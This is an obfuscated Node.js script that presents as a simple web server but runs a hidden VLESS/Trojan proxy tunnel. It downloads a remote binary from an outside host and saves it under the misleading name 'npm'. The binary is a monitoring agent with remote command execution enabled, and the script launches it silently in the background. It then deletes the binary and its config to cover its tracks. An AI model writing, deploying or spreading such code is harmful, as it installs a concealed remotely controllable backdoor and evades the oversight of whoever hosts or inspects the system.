const _0x277efa=_0x5121;(function(_0x53ec1c,_0x3ebd1a){const _0x4b4e1c=_0x5121,_0x2039ba=_0x53ec1c();while(!![]){try{const _0x124b09=-parseInt(_0x4b4e1c(0x111))/0x1*(-parseInt(_0x4b4e1c(0x11c))/0x2)+-parseInt(_0x4b4e1c(0x108))/0x3*(-parseInt(_0x4b4e1c(0xf4))/0x4)+parseInt(_0x4b4e1c(0xfc))/0x5*(-parseInt(_0x4b4e1c(0xf1))/0x6)+parseInt(_0x4b4e1c(0x130))/0x7*(parseInt(_0x4b4e1c(0x14a))/0x8)+-parseInt(_0x4b4e1c(0x134))/0x9+parseInt(_0x4b4e1c(0x12a))/0xa+parseInt(_0x4b4e1c(0x105))/0xb*(-parseInt(_0x4b4e1c(0x12f))/0xc);if(_0x124b09===_0x3ebd1a)break;else _0x2039ba['push'](_0x2039ba['shift']());}catch(_0x19a622){_0x2039ba['push'](_0x2039ba['shift']());}}}(_0x13d7,0xaac53));const os=require('os'),http=require(_0x277efa(0xfa)),fs=require('fs'),axios=require(_0x277efa(0x101)),net=require('net'),path=require(_0x277efa(0x153)),crypto=require(_0x277efa(0x15f)),{Buffer}=require(_0x277efa(0x128)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x277efa(0x127)]||_0x277efa(0x143),NEZHA_SERVER=process['env'][_0x277efa(0x141)]||'',NEZHA_PORT=process[_0x277efa(0x13a)][_0x277efa(0x115)]||'',NEZHA_KEY=process[_0x277efa(0x13a)][_0x277efa(0x139)]||'',DOMAIN=process['env'][_0x277efa(0x106)]||_0x277efa(0xee),AUTO_ACCESS=process['env'][_0x277efa(0x10a)]||!![],WSPATH=process[_0x277efa(0x13a)][_0x277efa(0x116)]||UUID[_0x277efa(0x120)](0x0,0x8),SUB_PATH=process['env'][_0x277efa(0xf5)]||_0x277efa(0x13f),NAME=process['env'][_0x277efa(0x148)]||'',PORT=process[_0x277efa(0x13a)][_0x277efa(0x168)]||0x1eb4;let ISP='';function _0x13d7(){const _0x36d0bb=['application/dns-json','8443','UUID','buffer','npm\x20is\x20running','2345860eJbjJo','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','substr','update','writeFileSync','12mcXNMo','14JSiAtt','url','map','Status','7884495xQdutG','Not\x20Found\x0a','find','reduce','Server\x20is\x20running\x20on\x20port\x20','NEZHA_KEY','env','write','Hello\x20world!','2053','\x20with\x20all\x20DNS\x20servers','sub','end','NEZHA_SERVER','npm','729a1266-f4bb-4025-abcc-9a65e07db6f7','pipe','false','arm64','log','NAME','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','1704224RoAVgz','readUInt16BE','Failed\x20to\x20resolve\x20','&path=%2F','country_code','Answer','index.html','client_secret:\x20','npm\x20running\x20error:','path','connect','2083','message','error:\x20','utf8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','trim','data','https://api.ip.sb/geoip','every','digest','crypto','application/json','concat','setsid\x20nohup\x20./npm\x20-s\x20','from','createHash','arch','text/html','Server','PORT','8.8.4.4','https://amd64.ssss.nyc.mn/v1','1234.abc.com','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','send','53232QJIidv','unlink','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','12jTlfrL','SUB_PATH','post','isp','\x20-p\x20','readUInt8','http','join','170uCUQMv','/bin/bash','close','text/plain','Automatic\x20Access\x20Task\x20added\x20successfully','axios','readFile','2087','get','12549361XjXkgb','DOMAIN','writeHead','1351929AODnmL','error','AUTO_ACCESS','listen','https://oooo.serv00.net/add-url','npm\x20download\x20successfully','1.1.1.1','then',':443?security=tls&sni=','502729SeIOyM','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','config.yaml','arm','NEZHA_PORT','WSPATH','length','npm\x20is\x20already\x20running,\x20skip\x20running...','toString','https://arm64.ssss.nyc.mn/agent','Unknown','4dunWrB','&fp=chrome&type=ws&host=','finish','catch','slice','test','https://arm64.ssss.nyc.mn/v1','includes','trojan://'];_0x13d7=function(){return _0x36d0bb;};return _0x13d7();}function _0x5121(_0x4fa9a6,_0x4b3c1d){_0x4fa9a6=_0x4fa9a6-0xec;const _0x13d73c=_0x13d7();let _0x512157=_0x13d73c[_0x4fa9a6];return _0x512157;}const GetISP=async()=>{const _0x5d0e92=_0x277efa;try{const _0x3e2deb=await axios['get'](_0x5d0e92(0x15c)),_0x771860=_0x3e2deb[_0x5d0e92(0x15b)];ISP=(_0x771860[_0x5d0e92(0x14e)]+'-'+_0x771860[_0x5d0e92(0xf7)])['replace'](/ /g,'_');}catch(_0x25ebb3){ISP=_0x5d0e92(0x11b);}};GetISP();const httpServer=http['createServer']((_0x3780e6,_0x2cbbdc)=>{const _0x59d950=_0x277efa;if(_0x3780e6[_0x59d950(0x131)]==='/'){const _0x246ff6=path[_0x59d950(0xfb)](__dirname,_0x59d950(0x150));fs[_0x59d950(0x102)](_0x246ff6,_0x59d950(0x158),(_0x343941,_0xfc30ab)=>{const _0x5c6579=_0x59d950;if(_0x343941){_0x2cbbdc[_0x5c6579(0x107)](0xc8,{'Content-Type':_0x5c6579(0x166)}),_0x2cbbdc[_0x5c6579(0x140)](_0x5c6579(0x13c));return;}_0x2cbbdc[_0x5c6579(0x107)](0xc8,{'Content-Type':_0x5c6579(0x166)}),_0x2cbbdc[_0x5c6579(0x140)](_0xfc30ab);});return;}else{if(_0x3780e6['url']==='/'+SUB_PATH){const _0x577b53=NAME?NAME+'-'+ISP:ISP,_0x4d8d61='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x59d950(0x11d)+DOMAIN+_0x59d950(0x14d)+WSPATH+'#'+_0x577b53,_0x2e73ca=_0x59d950(0x124)+UUID+'@'+DOMAIN+_0x59d950(0x110)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x59d950(0x14d)+WSPATH+'#'+_0x577b53,_0x3f0017=_0x4d8d61+'\x0a'+_0x2e73ca,_0x5726a8=Buffer[_0x59d950(0x163)](_0x3f0017)['toString']('base64');_0x2cbbdc[_0x59d950(0x107)](0xc8,{'Content-Type':_0x59d950(0xff)}),_0x2cbbdc[_0x59d950(0x140)](_0x5726a8+'\x0a');}else _0x2cbbdc['writeHead'](0x194,{'Content-Type':_0x59d950(0xff)}),_0x2cbbdc[_0x59d950(0x140)](_0x59d950(0x135));}}),wss=new WebSocket[(_0x277efa(0x167))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x277efa(0xec),_0x277efa(0x10e)];function resolveHost(_0x3c328a){return new Promise((_0x2b8d22,_0x5205a1)=>{const _0x1c4639=_0x5121;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1c4639(0x121)](_0x3c328a)){_0x2b8d22(_0x3c328a);return;}let _0x95b766=0x0;function _0x1fb2b7(){const _0x3f05d6=_0x1c4639;if(_0x95b766>=DNS_SERVERS[_0x3f05d6(0x117)]){_0x5205a1(new Error(_0x3f05d6(0x14c)+_0x3c328a+_0x3f05d6(0x13e)));return;}const _0x35a2df=DNS_SERVERS[_0x95b766];_0x95b766++;const _0x5019b7='https://dns.google/resolve?name='+encodeURIComponent(_0x3c328a)+'&type=A';axios['get'](_0x5019b7,{'timeout':0x1388,'headers':{'Accept':_0x3f05d6(0x125)}})[_0x3f05d6(0x10f)](_0x1e4944=>{const _0x1713bd=_0x3f05d6,_0x4a943f=_0x1e4944['data'];if(_0x4a943f[_0x1713bd(0x133)]===0x0&&_0x4a943f[_0x1713bd(0x14f)]&&_0x4a943f['Answer']['length']>0x0){const _0x4410c4=_0x4a943f[_0x1713bd(0x14f)][_0x1713bd(0x136)](_0x1de086=>_0x1de086['type']===0x1);if(_0x4410c4){_0x2b8d22(_0x4410c4['data']);return;}}_0x1fb2b7();})[_0x3f05d6(0x11f)](_0x5ec2ce=>{_0x1fb2b7();});}_0x1fb2b7();});}function handleVlessConnection(_0x51f636,_0x409920){const _0x3feb2e=_0x277efa,[_0x513d45]=_0x409920,_0x343695=_0x409920[_0x3feb2e(0x120)](0x1,0x11);if(!_0x343695['every']((_0x4bb66a,_0x33773e)=>_0x4bb66a==parseInt(uuid['substr'](_0x33773e*0x2,0x2),0x10)))return![];let _0x50413c=_0x409920[_0x3feb2e(0x120)](0x11,0x12)[_0x3feb2e(0xf9)]()+0x13;const _0x17dba1=_0x409920[_0x3feb2e(0x120)](_0x50413c,_0x50413c+=0x2)['readUInt16BE'](0x0),_0x523376=_0x409920['slice'](_0x50413c,_0x50413c+=0x1)[_0x3feb2e(0xf9)](),_0x293548=_0x523376==0x1?_0x409920['slice'](_0x50413c,_0x50413c+=0x4)[_0x3feb2e(0xfb)]('.'):_0x523376==0x2?new TextDecoder()['decode'](_0x409920[_0x3feb2e(0x120)](_0x50413c+0x1,_0x50413c+=0x1+_0x409920[_0x3feb2e(0x120)](_0x50413c,_0x50413c+0x1)[_0x3feb2e(0xf9)]())):_0x523376==0x3?_0x409920[_0x3feb2e(0x120)](_0x50413c,_0x50413c+=0x10)[_0x3feb2e(0x137)]((_0x21f412,_0x2da54f,_0x40f42e,_0x1d2a69)=>_0x40f42e%0x2?_0x21f412[_0x3feb2e(0x161)](_0x1d2a69['slice'](_0x40f42e-0x1,_0x40f42e+0x1)):_0x21f412,[])[_0x3feb2e(0x132)](_0x482ff8=>_0x482ff8['readUInt16BE'](0x0)[_0x3feb2e(0x119)](0x10))['join'](':'):'';_0x51f636[_0x3feb2e(0xf0)](new Uint8Array([_0x513d45,0x0]));const _0x4c4312=createWebSocketStream(_0x51f636);return resolveHost(_0x293548)[_0x3feb2e(0x10f)](_0x841057=>{const _0x78c69d=_0x3feb2e;net[_0x78c69d(0x154)]({'host':_0x841057,'port':_0x17dba1},function(){const _0x4829b6=_0x78c69d;this['write'](_0x409920[_0x4829b6(0x120)](_0x50413c)),_0x4c4312['on'](_0x4829b6(0x109),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x4c4312);})['on']('error',()=>{});})[_0x3feb2e(0x11f)](_0x591821=>{const _0x22d7bb=_0x3feb2e;net[_0x22d7bb(0x154)]({'host':_0x293548,'port':_0x17dba1},function(){const _0x39f3e3=_0x22d7bb;this[_0x39f3e3(0x13b)](_0x409920['slice'](_0x50413c)),_0x4c4312['on'](_0x39f3e3(0x109),()=>{})[_0x39f3e3(0x144)](this)['on']('error',()=>{})[_0x39f3e3(0x144)](_0x4c4312);})['on'](_0x22d7bb(0x109),()=>{});}),!![];}function handleTrojanConnection(_0x88b957,_0x70564b){const _0x60c527=_0x277efa;try{if(_0x70564b[_0x60c527(0x117)]<0x3a)return![];const _0x10f9fc=_0x70564b[_0x60c527(0x120)](0x0,0x38)[_0x60c527(0x119)](),_0x19b4e1=[UUID];let _0xc4a2a9=null;for(const _0x2d69bc of _0x19b4e1){const _0x2f5c96=crypto[_0x60c527(0x164)]('sha224')[_0x60c527(0x12d)](_0x2d69bc)[_0x60c527(0x15e)]('hex');if(_0x2f5c96===_0x10f9fc){_0xc4a2a9=_0x2d69bc;break;}}if(!_0xc4a2a9)return![];let _0x557691=0x38;_0x70564b[_0x557691]===0xd&&_0x70564b[_0x557691+0x1]===0xa&&(_0x557691+=0x2);const _0x3e172b=_0x70564b[_0x557691];if(_0x3e172b!==0x1)return![];_0x557691+=0x1;const _0x4bcd24=_0x70564b[_0x557691];_0x557691+=0x1;let _0x4adb6f,_0x2d5559;if(_0x4bcd24===0x1)_0x4adb6f=_0x70564b['slice'](_0x557691,_0x557691+0x4)[_0x60c527(0xfb)]('.'),_0x557691+=0x4;else{if(_0x4bcd24===0x3){const _0x2e457d=_0x70564b[_0x557691];_0x557691+=0x1,_0x4adb6f=_0x70564b['slice'](_0x557691,_0x557691+_0x2e457d)['toString'](),_0x557691+=_0x2e457d;}else{if(_0x4bcd24===0x4)_0x4adb6f=_0x70564b['slice'](_0x557691,_0x557691+0x10)[_0x60c527(0x137)]((_0xf647a1,_0x6ac274,_0x4c8499,_0x3bdfb4)=>_0x4c8499%0x2?_0xf647a1[_0x60c527(0x161)](_0x3bdfb4[_0x60c527(0x120)](_0x4c8499-0x1,_0x4c8499+0x1)):_0xf647a1,[])['map'](_0x1ec666=>_0x1ec666[_0x60c527(0x14b)](0x0)['toString'](0x10))[_0x60c527(0xfb)](':'),_0x557691+=0x10;else return![];}}_0x2d5559=_0x70564b[_0x60c527(0x14b)](_0x557691),_0x557691+=0x2;_0x557691<_0x70564b[_0x60c527(0x117)]&&_0x70564b[_0x557691]===0xd&&_0x70564b[_0x557691+0x1]===0xa&&(_0x557691+=0x2);const _0x6909c1=createWebSocketStream(_0x88b957);return resolveHost(_0x4adb6f)[_0x60c527(0x10f)](_0x16d0a1=>{const _0x2fa8cb=_0x60c527;net['connect']({'host':_0x16d0a1,'port':_0x2d5559},function(){const _0x16037e=_0x5121;_0x557691<_0x70564b[_0x16037e(0x117)]&&this['write'](_0x70564b[_0x16037e(0x120)](_0x557691)),_0x6909c1['on'](_0x16037e(0x109),()=>{})['pipe'](this)['on'](_0x16037e(0x109),()=>{})[_0x16037e(0x144)](_0x6909c1);})['on'](_0x2fa8cb(0x109),()=>{});})[_0x60c527(0x11f)](_0x58175f=>{const _0x223c1b=_0x60c527;net[_0x223c1b(0x154)]({'host':_0x4adb6f,'port':_0x2d5559},function(){const _0x4d40d4=_0x223c1b;_0x557691<_0x70564b[_0x4d40d4(0x117)]&&this[_0x4d40d4(0x13b)](_0x70564b[_0x4d40d4(0x120)](_0x557691)),_0x6909c1['on'](_0x4d40d4(0x109),()=>{})[_0x4d40d4(0x144)](this)['on']('error',()=>{})['pipe'](_0x6909c1);})['on'](_0x223c1b(0x109),()=>{});}),!![];}catch(_0x4b1703){return![];}}wss['on']('connection',(_0x1a8d03,_0x1db2b9)=>{const _0x2bdc5a=_0x277efa,_0x1bd1d6=_0x1db2b9[_0x2bdc5a(0x131)]||'';_0x1a8d03['once'](_0x2bdc5a(0x156),_0x3bca0c=>{const _0x528c6f=_0x2bdc5a;if(_0x3bca0c[_0x528c6f(0x117)]>0x11&&_0x3bca0c[0x0]===0x0){const _0x152c50=_0x3bca0c[_0x528c6f(0x120)](0x1,0x11),_0x1dee94=_0x152c50[_0x528c6f(0x15d)]((_0x344ff1,_0x209f62)=>_0x344ff1==parseInt(uuid[_0x528c6f(0x12c)](_0x209f62*0x2,0x2),0x10));if(_0x1dee94){!handleVlessConnection(_0x1a8d03,_0x3bca0c)&&_0x1a8d03['close']();return;}}!handleTrojanConnection(_0x1a8d03,_0x3bca0c)&&_0x1a8d03[_0x528c6f(0xfe)]();})['on'](_0x2bdc5a(0x109),()=>{});});const getDownloadUrl=()=>{const _0x5d4721=_0x277efa,_0x4e7696=os[_0x5d4721(0x165)]();return _0x4e7696===_0x5d4721(0x114)||_0x4e7696===_0x5d4721(0x146)||_0x4e7696==='aarch64'?!NEZHA_PORT?_0x5d4721(0x122):_0x5d4721(0x11a):!NEZHA_PORT?_0x5d4721(0xed):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0xa7c3aa=_0x277efa;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2dfca6=getDownloadUrl(),_0x25df98=await axios({'method':_0xa7c3aa(0x104),'url':_0x2dfca6,'responseType':'stream'}),_0x2c5890=fs['createWriteStream'](_0xa7c3aa(0x142));return _0x25df98[_0xa7c3aa(0x15b)][_0xa7c3aa(0x144)](_0x2c5890),new Promise((_0x2acff5,_0x1c8abd)=>{const _0x48ef10=_0xa7c3aa;_0x2c5890['on'](_0x48ef10(0x11e),()=>{const _0x44fdb3=_0x48ef10;console['log'](_0x44fdb3(0x10d)),exec('chmod\x20+x\x20npm',_0x484700=>{if(_0x484700)_0x1c8abd(_0x484700);_0x2acff5();});}),_0x2c5890['on'](_0x48ef10(0x109),_0x1c8abd);});}catch(_0x5eccf0){throw _0x5eccf0;}},runnz=async()=>{const _0x5801f1=_0x277efa;try{const _0x577366=execSync(_0x5801f1(0x149),{'encoding':'utf-8'});if(_0x577366[_0x5801f1(0x15a)]()!==''){console['log'](_0x5801f1(0x118));return;}}catch(_0x3b60b2){}await downloadFile();let _0x44de6d='',_0x3f340e=['443',_0x5801f1(0x126),'2096',_0x5801f1(0x103),_0x5801f1(0x155),_0x5801f1(0x13d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3d3cf3=_0x3f340e[_0x5801f1(0x123)](NEZHA_PORT)?'--tls':'';_0x44de6d=_0x5801f1(0x162)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5801f1(0xf8)+NEZHA_KEY+'\x20'+_0x3d3cf3+_0x5801f1(0x159);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5a1ca9=NEZHA_SERVER[_0x5801f1(0x123)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x1e6200=_0x3f340e[_0x5801f1(0x123)](_0x5a1ca9)?'true':_0x5801f1(0x145),_0x486a77=_0x5801f1(0x151)+NEZHA_KEY+_0x5801f1(0xef)+NEZHA_SERVER+_0x5801f1(0x12b)+_0x1e6200+_0x5801f1(0x112)+UUID;fs[_0x5801f1(0x12e)](_0x5801f1(0x113),_0x486a77);}_0x44de6d='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x5801f1(0x147)](_0x5801f1(0xf3));return;}}try{exec(_0x44de6d,{'shell':_0x5801f1(0xfd)},_0x6e4e25=>{const _0x7266c=_0x5801f1;if(_0x6e4e25)console[_0x7266c(0x109)](_0x7266c(0x152),_0x6e4e25);else console[_0x7266c(0x147)](_0x7266c(0x129));});}catch(_0x2bd793){console[_0x5801f1(0x109)](_0x5801f1(0x157)+_0x2bd793);}};async function addAccessTask(){const _0x31a822=_0x277efa;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x27f48c='https://'+DOMAIN;try{const _0x5d7e6f=await axios[_0x31a822(0xf6)](_0x31a822(0x10c),{'url':_0x27f48c},{'headers':{'Content-Type':_0x31a822(0x160)}});console[_0x31a822(0x147)](_0x31a822(0x100));}catch(_0x433ab1){}}const delFiles=()=>{const _0x50b6b6=_0x277efa;fs[_0x50b6b6(0xf2)](_0x50b6b6(0x142),()=>{}),fs[_0x50b6b6(0xf2)](_0x50b6b6(0x113),()=>{});};httpServer[_0x277efa(0x10b)](PORT,()=>{const _0x54106d=_0x277efa;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x54106d(0x147)](_0x54106d(0x138)+PORT);});
